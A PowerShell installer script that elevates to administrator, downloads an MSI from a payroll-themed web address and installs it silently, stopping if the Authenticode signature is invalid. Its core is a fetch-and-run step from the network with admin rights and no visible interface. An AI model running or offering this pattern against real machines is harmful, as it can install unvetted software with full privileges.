
# Download and install an MSI package
# Run on a PC you own or are authorized to administer.

$ErrorActionPreference = 'Stop'

$DownloadUrl = 'https://payrollmanagerhub.com/downloads/new/new.msi'
$InstallFolder = 'C:\ProgramInstaller'
$MsiPath = Join-Path $InstallFolder 'program.msi'
$LogPath = Join-Path $InstallFolder 'install.log'

# Request administrator privileges if not already elevated.
$IsAdmin = ([Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
)).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

if (-not $IsAdmin) {
    $PowerShellExe = (Get-Process -Id $PID).Path
    $Arguments = '-NoProfile -ExecutionPolicy RemoteSigned -File "{0}"' -f $PSCommandPath

    Start-Process -FilePath $PowerShellExe `
        -ArgumentList $Arguments `
        -Verb RunAs
    exit
}

try {
    # Create the destination folder.
    New-Item -Path $InstallFolder -ItemType Directory -Force |
        Out-Null

    Write-Host 'Downloading installer...'

    # Download the MSI.
    Invoke-WebRequest -Uri $DownloadUrl `
        -OutFile $MsiPath `
        -UseBasicParsing

    if (-not (Test-Path $MsiPath) -or
        (Get-Item $MsiPath).Length -eq 0) {
        throw 'The downloaded MSI is missing or empty.'
    }

    # Show signature information for verification.
    $Signature = Get-AuthenticodeSignature -FilePath $MsiPath

    Write-Host "Saved to: $MsiPath"
    Write-Host "Signature status: $($Signature.Status)"
    Write-Host "Signer: $($Signature.SignerCertificate.Subject)"

    # Stop if the package is not signed.
    # Confirm the publisher and obtain a trusted installer
    # before changing this check.
    if ($Signature.Status -ne 'Valid') {
        throw 'Installer signature is not valid. Installation cancelled.'
    }

    Write-Host 'Starting silent installation...'

    # Run Windows Installer without its normal UI.
    $Process = Start-Process -FilePath 'msiexec.exe' `
        -ArgumentList @(
            '/i'
            "`"$MsiPath`""
            '/qn'
            '/norestart'
            '/L*v'
            "`"$LogPath`""
        ) `
        -Wait `
        -PassThru

    if ($Process.ExitCode -notin @(0, 3010)) {
        throw "Installation failed with exit code $($Process.ExitCode). See $LogPath"
    }

    Write-Host 'Installation completed successfully.'
    Write-Host "Installer log: $LogPath"

    if ($Process.ExitCode -eq 3010) {
        Write-Host 'A restart is required to complete installation.'
    }
}
catch {
    Write-Error $_
    exit 1
}
